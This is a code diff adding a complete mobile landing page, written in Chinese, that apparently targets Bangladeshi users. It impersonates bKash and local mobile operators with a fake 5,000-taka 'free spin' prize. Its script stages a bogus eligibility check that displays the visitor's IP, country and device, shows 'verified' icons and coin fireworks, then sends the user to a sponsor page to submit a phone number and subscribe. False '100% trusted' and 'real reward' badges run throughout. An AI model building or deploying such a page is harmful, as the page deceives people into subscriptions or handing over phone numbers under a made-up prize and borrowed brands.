@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>免费旋转 – 赢取大奖</title>
+    <style>
+        /* ===== 样式 ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        html, body {
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            position: fixed;
+            top: 0;
+            left: 0;
+            background: #000;
+        }
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            padding: 12px;
+        }
+        .card {
+            max-width: 440px;
+            width: 100%;
+            max-height: 98vh;
+            background: white;
+            border-radius: 32px;
+            overflow-y: auto;
+            overflow-x: hidden;
+            text-align: center;
+            box-shadow: 0 20px 35px rgba(0,0,0,0.4);
+            -webkit-overflow-scrolling: touch;
+            position: relative;
+            z-index: 1;
+        }
+        .card::-webkit-scrollbar {
+            width: 4px;
+        }
+        .card::-webkit-scrollbar-track {
+            background: #f1f1f1;
+            border-radius: 10px;
+        }
+        .card::-webkit-scrollbar-thumb {
+            background: #c1c1c1;
+            border-radius: 10px;
+        }
+        .header {
+            background: #E2136E;
+            padding: 20px 16px;
+            color: white;
+        }
+        .header h1 {
+            font-size: 1.6rem;
+            margin-bottom: 6px;
+        }
+        .subhead {
+            font-size: 0.9rem;
+            opacity: 0.9;
+        }
+        .prize-body {
+            padding: 20px 20px 25px;
+        }
+        .slot-machine {
+            background: #f1f5f9;
+            border-radius: 24px;
+            padding: 20px;
+            margin: 15px 0;
+        }
+        /* 固定高度容器 — 解决滚动抖动 */
+        .rolling-numbers {
+            font-size: 1.4rem;
+            font-weight: bold;
+            background: #fff;
+            padding: 16px;
+            border-radius: 20px;
+            border: 2px solid #e2e8f0;
+            margin-bottom: 12px;
+            color: #1e293b;
+            line-height: 1.4;
+            min-height: 90px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 0 4px;
+        }
+        .rolling-numbers span {
+            font-size: 2.2rem;
+            font-weight: 900;
+            color: #E2136E;
+            display: inline-block;
+            margin: 0 2px;
+            min-width: 80px;
+            text-align: center;
+        }
+        .rolling-numbers .static-text {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #1e293b;
+            white-space: nowrap;
+        }
+        .rolling-numbers .prize-label {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #1e293b;
+            white-space: nowrap;
+        }
+        .offer-details {
+            background: #f8fafc;
+            border-radius: 20px;
+            padding: 12px 16px;
+            margin: 16px 0 0;
+            text-align: left;
+            font-size: 0.8rem;
+            line-height: 1.5;
+            color: #1e293b;
+        }
+        .offer-details p {
+            margin: 6px 0;
+        }
+        .offer-details strong {
+            color: #E2136E;
+        }
+        .trust-line {
+            font-size: 0.7rem;
+            text-align: center;
+            margin-top: 10px;
+            color: #2c6e2c;
+            background: #e6f7e6;
+            padding: 6px 12px;
+            border-radius: 30px;
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            flex-wrap: wrap;
+        }
+        .footer {
+            font-size: 0.6rem;
+            color: #94a3b8;
+            margin-top: 12px;
+            text-align: center;
+        }
+
+        /* ===== 通用 ===== */
+        .hidden {
+            display: none !important;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: row;
+            justify-content: center;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 1.2rem;
+            border: 2px solid #e2e8f0;
+            border-radius: 12px;
+            text-align: center;
+            background: #f8fafc;
+            transition: border-color 0.2s;
+            outline: none;
+        }
+        .form-group input:focus {
+            border-color: #3A7CAE;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 14px;
+            border: none;
+            border-radius: 60px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            color: white;
+            cursor: pointer;
+            transition: 0.1s ease;
+            background: #E2136E;
+            position: relative;
+            z-index: 2;
+        }
+        .btn-primary:active {
+            transform: scale(0.97);
+        }
+        .btn-primary:disabled {
+            opacity: 0.6;
+            transform: none;
+        }
+
+        .error-msg {
+            color: #dc2626;
+            font-size: 0.85rem;
+            margin-top: 8px;
+            padding: 8px 12px;
+            background: #fef2f2;
+            border-radius: 8px;
+            display: none;
+        }
+        .error-msg.show {
+            display: block;
+        }
+
+        /* ===== 进度条 ===== */
+        .progress-wrap {
+            margin-top: 16px;
+            width: 100%;
+        }
+        .progress-track {
+            width: 100%;
+            height: 8px;
+            background: #e2e8f0;
+            border-radius: 99px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            border-radius: 99px;
+            background: linear-gradient(90deg, #E2136E, #ff5fa2);
+            box-shadow: 0 0 8px rgba(226, 19, 110, 0.45);
+            transition: width 0.85s cubic-bezier(.25, .8, .25, 1);
+            position: relative;
+        }
+        .progress-fill::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,.55), transparent);
+            animation: shine 1.2s linear infinite;
+        }
+        @keyframes shine {
+            from { transform: translateX(-100%); }
+            to   { transform: translateX(100%); }
+        }
+        .progress-text {
+            margin-top: 8px;
+            font-size: 0.82rem;
+            color: #64748b;
+            text-align: center;
+            min-height: 1.2em;
+        }
+
+        /* ===== 烟花容器 ===== */
+        #fireworkContainer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 9999;
+            overflow: hidden;
+        }
+
+        /* ===== 钱币粒子 ===== */
+        .coin-particle {
+            position: absolute;
+            font-size: 28px;
+            animation: coinExplode 1s ease-out forwards;
+            pointer-events: none;
+        }
+
+        @keyframes coinExplode {
+            0% {
+                opacity: 1;
+                transform: translate(0, 0) scale(0.3) rotate(0deg);
+            }
+            100% {
+                opacity: 0;
+                transform: translate(var(--tx), var(--ty)) scale(1) rotate(var(--rot));
+            }
+        }
+
+        /* 屏幕闪烁效果 */
+        .flash-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 215, 0, 0.25);
+            pointer-events: none;
+            z-index: 9998;
+            animation: flash 0.3s ease-out forwards;
+        }
+
+        @keyframes flash {
+            0% { opacity: 1; }
+            100% { opacity: 0; }
+        }
+
+        @media (max-height: 700px) {
+            .header { padding: 12px 16px; }
+            .prize-body { padding: 12px 16px 20px; }
+            .slot-machine { padding: 12px; margin: 10px 0; }
+            .rolling-numbers { font-size: 1rem; padding: 12px; min-height: 70px; }
+            .rolling-numbers span { font-size: 1.6rem; min-width: 60px; }
+            .btn-primary { padding: 12px; font-size: 1rem; }
+        }
+        @media (max-height: 600px) {
+            .rolling-numbers { min-height: 60px; padding: 8px; }
+            .rolling-numbers span { font-size: 1.4rem; min-width: 50px; }
+        }
+
+        .input-hint {
+            display: block;
+            font-size: 0.85rem;
+            color: #64748b;
+            margin-top: 4px;
+            text-align: center;
+        }
+        img.input-hint {
+            width: 16px;
+            height: 16px;
+            object-fit: contain;
+            display: inline-block;
+            vertical-align: middle;
+        }
+
+        .form-group2 {
+            display: flex;
+            justify-content: center;
+            flex-direction: row;
+        }
+        .form-group3 {
+            display: flex;
+            justify-content: center;
+            flex-direction: row;
+        }
+
+        #last {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 93%;
+            max-width: 360px;
+            padding: 0;
+            border: none;
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 200px;
+            background-color: #f0f0f0;
+            z-index: 1000;
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+            gap: 12px;
+        }
+        #last button {
+            margin-top: auto;
+            padding: 10px 24px;
+            border: none;
+            border-radius: 60px;
+            background-color: #408559;
+            color: white;
+            font-size: 1rem;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .operator-logos {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            align-items: center;
+            gap: 12px 16px;
+            max-width: 300px;
+            margin: 0 auto;
+            padding: 10px 0;
+        }
+        .operator-logos img {
+            height: 20px;
+            width: auto;
+            object-fit: contain;
+            opacity: 0.8;
+        }
+    </style>
+</head>
+<body>
+
+<!-- ===== 最后的验证弹层 ===== -->
+<div id="last" class="hidden">
+    <div style="
+        background: #E2136E;
+        color: #f8f7f7;
+        font-size: 2rem;
+        font-weight: 900;
+        text-align: center;
+        width: 100%;
+        margin: 0;
+        padding: 30px 0;
+    ">
+        <img src="bkash.png" alt="角标" style="width: 90px; height: auto; display: block; margin: 0 auto 10px;">
+        🎉 恭喜！ 🎉
+    </div>
+
+    <p style="font-size:0.8rem; color:#408559; margin-top:6px; font-weight:600;">
+        ✅ 资格校验已通过
+    </p>
+
+    <h4>最后一步：验证手机号</h4>
+    <p>5000塔卡将充值到您的手机号</p>
+    <p>进入赞助商的页面，填入手机号，验证手机号</p>
+
+    <button id="tiaozhuan" onclick="goToOffer()"
+        style="background: #E2136E; color: #fff; border: none; border-radius: 30px; padding: 12px 24px; cursor: pointer;">
+        🎯 点击验证手机号
+    </button>
+
+    <div style="margin-top: 8px; font-size: 0.75rem; color: #E2136E; font-weight: 500;">
+        限时优惠 | 仅限用户
+    </div>
+
+    <div class="operator-logos">
+        <img src="Grameenphone.png" style="transform: scale(2.5);" alt="GP">
+        <img src="Robi.png" style="transform: scale(1.3);" alt="Robi">
+        <img src="Banglalink.png" style="transform: scale(1.3);" alt="Banglalink">
+        <img src="Airtel.png" style="transform: scale(1.3);" alt="Airtel">
+        <img src="TeleTalk.png" style="transform: scale(2);" alt="TeleTalk">
+        <img src="WiFi.png" style="transform: scale(1.3);" alt="WiFi">
+    </div>
+
+    <div class="trust-line" style="color: #E2136E; margin-top: auto; margin-bottom: 20px; width: calc(100% - 40px); justify-content: center;">
+        🔒 安全交易 | ✅ 100% 可信 | 🏆 真实奖励
+    </div>
+</div>
+
+<!-- ===== 烟花容器 ===== -->
+<div id="fireworkContainer"></div>
+
+<!-- ===== 主卡片 ===== -->
+<div class="card">
+
+    <!-- 第一个界面 Header -->
+    <div class="header" id="headerFirst">
+        <img src="bkash.png" class="corner-img" alt="角标" style="width: 90px; height: auto;">
+        <h1>🎉 免费旋转 🎉</h1>
+        <div class="subhead">今日幸运用户！</div>
+    </div>
+
+    <!-- 第二个界面 Header -->
+    <div class="header" id="headerSecond" style="display:none;">
+        <img src="bkash.png" class="corner-img" alt="角标" style="width: 90px; height: auto;">
+        <h1 style="color:#faf9f9;">🎉 恭喜！ 🎉</h1>
+        <!-- <div class="subhead" style="color:#fdfcfc; font-size:1.1rem;">
+            🎊 您已经中得 <strong style="color:#fafaf9;">5,000</strong> 塔卡大奖！ 🎊
+        </div> -->
+    </div>
+
+    <div class="prize-body">
+
+        <!-- ===== 初始游戏区域 ===== -->
+        <div id="gameSection">
+            <div class="slot-machine">
+                <div class="rolling-numbers">
+                    <span class="static-text">只需一杯茶的钱，赢取</span>
+                    <span id="rollingNumber">5,000</span>
+                    <span class="prize-label">塔卡奖励！</span>
+                </div>
+                <button class="btn-primary" id="playBtn">🎯 领取奖励</button>
+            </div>
+            <div class="offer-details">
+                <p>✅ 订阅 → 领取奖励</p>
+                <p>🎁 奖品将在2分钟内以 <strong>手机充值</strong> 形式发放</p>
+            </div>
+
+            <div class="footer" style="margin-top: 20px;">
+                <div style="margin-top: 8px; font-size: 0.75rem; color: #E2136E; font-weight: 500;">
+                    限时优惠 | 仅限用户
+                </div>
+                <div class="operator-logos">
+                    <img src="Grameenphone.png" style="transform: scale(2.5);" alt="GP">
+                    <img src="Robi.png" style="transform: scale(1.3);" alt="Robi">
+                    <img src="Banglalink.png" style="transform: scale(1.3);" alt="Banglalink">
+                    <img src="Airtel.png" style="transform: scale(1.3);" alt="Airtel">
+                    <img src="TeleTalk.png" style="transform: scale(2);" alt="TeleTalk">
+                    <img src="WiFi.png" style="transform: scale(1.3);" alt="WiFi">
+                </div>
+
+                <div class="trust-line" style="color: #E2136E;">
+                    🔒 安全交易 | ✅ 100% 可信 | 🏆 真实奖励
+                </div>
+            </div>
+        </div>
+
+        <!-- ===== 资格校验区域（第二个界面） ===== -->
+        <div id="phoneSection" class="hidden">
+            <img id="loading" src="loading.gif" class="loading" alt="">
+
+            <div class="form-group">
+                <div id="phoneHint" style="font-size:1.0rem; color:#1e293b; margin-bottom:6px;">IP: 192.168.1.1</div>
+                <img id="checkIcon" src="check_icon.png" class="input-hint hidden" alt="IP地址">
+            </div>
+            <div class="form-group2">
+                <div id="phoneHint2" style="font-size:1.0rem; color:#1e293b; margin-bottom:6px;">国家: 孟加拉</div>
+                <img id="checkIcon2" src="check_icon.png" class="input-hint hidden" alt="国家">
+            </div>
+            <div class="form-group3">
+                <div id="phoneHint3" style="font-size:1.0rem; color:#1e293b; margin-bottom:6px;">设备: 手机</div>
+                <img id="checkIcon3" src="check_icon.png" class="input-hint hidden" alt="设备">
+            </div>
+
+            <!-- 进度条 -->
+            <div class="progress-wrap" id="progressWrap">
+                <div class="progress-track">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+                <div class="progress-text" id="progressText">正在检测…</div>
+            </div>
+
+            <div class="trust-line" style="margin-top:12px; font-size:0.65rem;">
+                <div style="margin-top: 8px; font-size: 0.75rem; color: #E2136E; font-weight: 500;">
+                    限时优惠 | 仅限用户
+                </div>
+                <div class="operator-logos">
+                    <img src="Grameenphone.png" style="transform: scale(2.5);" alt="GP">
+                    <img src="Robi.png" style="transform: scale(1.3);" alt="Robi">
+                    <img src="Banglalink.png" style="transform: scale(1.3);" alt="Banglalink">
+                    <img src="Airtel.png" style="transform: scale(1.3);" alt="Airtel">
+                    <img src="TeleTalk.png" style="transform: scale(2);" alt="TeleTalk">
+                    <img src="WiFi.png" style="transform: scale(1.3);" alt="WiFi">
+                </div>
+
+                <div class="trust-line" style="color: #E2136E;">
+                    🔒 安全交易 | ✅ 100% 可信 | 🏆 真实奖励
+                </div>
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<script>
+// ============================================================
+// IP 获取
+// ============================================================
+fetch('https://api64.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => {
+        document.getElementById('phoneHint').textContent = 'IP地址: ' + data.ip;
+    })
+    .catch(() => {
+        document.getElementById('phoneHint').textContent = 'IP地址: 获取失败';
+    });
+
+// ============================================================
+// 状态
+// ============================================================
+let fireworksTriggered = false;
+
+const headerFirst  = document.getElementById('headerFirst');
+const headerSecond = document.getElementById('headerSecond');
+const gameSection  = document.getElementById('gameSection');
+const phoneSection = document.getElementById('phoneSection');
+const fireworkContainer = document.getElementById('fireworkContainer');
+
+const progressFill = document.getElementById('progressFill');
+const progressText = document.getElementById('progressText');
+
+// ============================================================
+// 工具函数
+// ============================================================
+function show(id) { document.getElementById(id).classList.remove('hidden'); }
+function hide(id) { document.getElementById(id).classList.add('hidden'); }
+
+function setProgress(pct, label) {
+    progressFill.style.width = pct + '%';
+    if (label) progressText.textContent = label;
+}
+
+// ============================================================
+// 💰 钱币烟花效果
+// ============================================================
+const coinEmojis = ['💰', '💵', '💎', '✨'];
+
+function createCoinExplosion(x, y) {
+    const flash = document.createElement('div');
+    flash.className = 'flash-overlay';
+    document.body.appendChild(flash);
+    setTimeout(() => flash.remove(), 400);
+
+    const count = 15 + Math.floor(Math.random() * 10);
+    const particles = [];
+
+    for (let i = 0; i < count; i++) {
+        const coin = document.createElement('div');
+        coin.className = 'coin-particle';
+        coin.textContent = coinEmojis[Math.floor(Math.random() * coinEmojis.length)];
+
+        const size = 22 + Math.floor(Math.random() * 20);
+        coin.style.fontSize = size + 'px';
+
+        const angle = -Math.PI / 2 + (Math.random() - 0.5) * Math.PI * 1.4;
+        const distance = 60 + Math.random() * 150;
+        const tx = Math.cos(angle) * distance;
+        const ty = Math.sin(angle) * distance - 30;
+        const rot = (Math.random() - 0.5) * 360;
+
+        coin.style.setProperty('--tx', tx + 'px');
+        coin.style.setProperty('--ty', ty + 'px');
+        coin.style.setProperty('--rot', rot + 'deg');
+
+        coin.style.animationDelay = (Math.random() * 0.15) + 's';
+        coin.style.left = (x + (Math.random() - 0.5) * 20) + 'px';
+        coin.style.top = (y + (Math.random() - 0.5) * 20) + 'px';
+
+        fireworkContainer.appendChild(coin);
+        particles.push(coin);
+    }
+
+    setTimeout(() => {
+        particles.forEach(p => p.remove());
+    }, 1500);
+}
+
+function triggerFireworks() {
+    if (fireworksTriggered) return;
+    fireworksTriggered = true;
+
+    const target = document.getElementById('last');
+    const rect = target.getBoundingClientRect();
+    const centerX = rect.left + rect.width / 2;
+    const centerY = rect.top + rect.height * 0.3;
+
+    const waves = [0, 400];
+    waves.forEach((delay) => {
+        setTimeout(() => {
+            for (let i = 0; i < 2; i++) {
+                const offsetX = (Math.random() - 0.5) * 160;
+                const offsetY = (Math.random() - 0.5) * 100;
+                setTimeout(() => {
+                    createCoinExplosion(centerX + offsetX, centerY + offsetY - 30);
+                }, i * 120);
+            }
+        }, delay);
+    });
+}
+
+// ============================================================
+// 滚动数字动画
+// ============================================================
+const prizes = ["5,000", "3,000", "2,000", "1,000"];
+let rollingInterval = null;
+const rollingSpan = document.getElementById('rollingNumber');
+
+function startRolling() {
+    if (rollingInterval) clearInterval(rollingInterval);
+    rollingInterval = setInterval(() => {
+        const randomIndex = Math.floor(Math.random() * prizes.length);
+        rollingSpan.innerText = prizes[randomIndex];
+    }, 120);
+}
+startRolling();
+
+// ============================================================
+// 点击「领取奖励」→ 资格校验 → 校验通过 → 弹出最后一步
+// ============================================================
+document.getElementById('playBtn').addEventListener('click', function () {
+    headerFirst.style.display = 'none';
+    headerSecond.style.display = 'block';
+
+    hide('gameSection');
+    show('phoneSection');
+
+    const hint  = document.getElementById('phoneHint');
+    const icon  = document.getElementById('checkIcon');
+    const hint2 = document.getElementById('phoneHint2');
+    const icon2 = document.getElementById('checkIcon2');
+    const hint3 = document.getElementById('phoneHint3');
+    const icon3 = document.getElementById('checkIcon3');
+
+    // 重置
+    [hint, icon, hint2, icon2, hint3, icon3].forEach(el => {
+        if (el) el.classList.add('hidden');
+    });
+    setProgress(0, '正在检测…');
+
+    // 25% — 网络环境
+    setTimeout(() => {
+        if (hint) hint.classList.remove('hidden');
+        if (icon) icon.classList.remove('hidden');
+        setProgress(25, '正在检测网络环境…');
+    }, 500);
+
+    // 50% — 地区识别
+    setTimeout(() => {
+        if (hint2) hint2.classList.remove('hidden');
+        if (icon2) icon2.classList.remove('hidden');
+        setProgress(50, '正在识别所在地区…');
+    }, 2000);
+
+    // 75% — 设备确认
+    setTimeout(() => {
+        if (hint3) hint3.classList.remove('hidden');
+        if (icon3) icon3.classList.remove('hidden');
+        setProgress(75, '正在确认设备信息…');
+    }, 4000);
+
+    // 100% — 资格校验通过（停留 800ms 让用户看清）
+    setTimeout(() => {
+        document.getElementById('loading').classList.add('hidden');
+        setProgress(100, '✅开始验证手机号码…');
+    }, 6000);
+
+    // 4600ms — 才切换界面 + 触发烟花
+    setTimeout(() => {
+        headerSecond.classList.add('hidden');
+        document.querySelector('.card').classList.add('hidden');
+        document.getElementById('last').classList.remove('hidden');
+        triggerFireworks();
+    }, 8500);
+});
+
+// ============================================================
+// 跳转
+// ============================================================
+function goToOffer() {
+    // 这里可以加埋点统计、参数拼接等
+    window.location.href = 'https://www.baidu.com';
+}
+</script>
+</body>
+</html>
